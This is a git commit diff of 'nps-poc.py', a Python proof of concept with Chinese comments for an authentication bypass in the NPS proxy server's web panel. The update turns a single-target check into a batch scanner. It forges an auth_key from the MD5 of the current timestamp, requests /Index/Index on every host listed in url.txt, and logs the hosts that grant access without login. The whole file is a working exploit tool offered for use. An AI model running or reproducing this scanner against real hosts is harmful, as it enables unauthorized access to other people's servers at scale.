ff69c2c83f0636844441c31f5a5de252b98421f8
redraccoon <88136870+weierbao@users.noreply.github.com>
2024-01-27 20:33:12 +0800

    Update nps-poc.py

--- nps-poc.py
+++ nps-poc.py
@@ -1,39 +1,42 @@
 import hashlib
-import datetime
 import time
 import requests
-import webbrowser
 
-#  输入url地址
-url = input("请输入漏洞网址:")
+def check(url):
+    # 获取当前时间戳
+    timestamps = int(time.time())
+    # 将时间戳转换为字符串并进行编码
+    timestamp_str = str(timestamps).encode('utf-8')
+    # 创建一个MD5哈希对象
+    hash_object = hashlib.md5()
+    # 对时间戳进行加密
+    hash_object.update(timestamp_str)
+    # 获取加密后的结果
+    encrypted_timestamp = hash_object.hexdigest()
+    #  输出加密后并访问的url地址
+    vuln = f"http://{url}/Index/Index?auth_key={encrypted_timestamp}&timestamp={timestamps}"
+    #  请求这个漏洞地址
+    response = requests.get(f"{vuln}")
+    if "login" not in response.url:
+        print(f"{vuln} 存在未授权漏洞")
+        write_data(f"{vuln} 存在未授权漏洞")
+   
+def get_url():
+    with open("url.txt","r+",encoding="utf-8") as f:
+        data = f.readlines()
+        return data
+    
+def write_data(content):
+    with open('./result.txt','a',encoding='utf-8') as f:
+        f.write(content+"\n")
 
-# 获取当前时间戳
-timestamps = int(time.time())
+if __name__ == '__main__':    
 
-# 将时间戳转换为字符串并进行编码
-timestamp_str = str(timestamps).encode('utf-8')
-
-# 创建一个MD5哈希对象
-hash_object = hashlib.md5()
-
-# 对时间戳进行加密
-hash_object.update(timestamp_str)
-
-# 获取加密后的结果
-encrypted_timestamp = hash_object.hexdigest()
-
-#  输出加密后并访问的url地址
-vuln = f"{url}Index/Index?auth_key={encrypted_timestamp}&timestamp={timestamps}"
-
-#  请求这个漏洞地址
-response = requests.get(f"{vuln}")
-
-#  看看返回装状态码
-# print("状态码：", response.status_code)
-
-# 判断请求是否成功
-if response.status_code == 200:
-    print("nps未授权漏洞利用成功")
-    webbrowser.open(vuln)
-else:
-    print("nps未授权漏洞利用失败")
+    data = get_url()
+    for i in data:
+        url = i.replace("\n","")
+        try:
+            check(url)
+        except Exception as e:
+            print(e)
+        time.sleep(1)
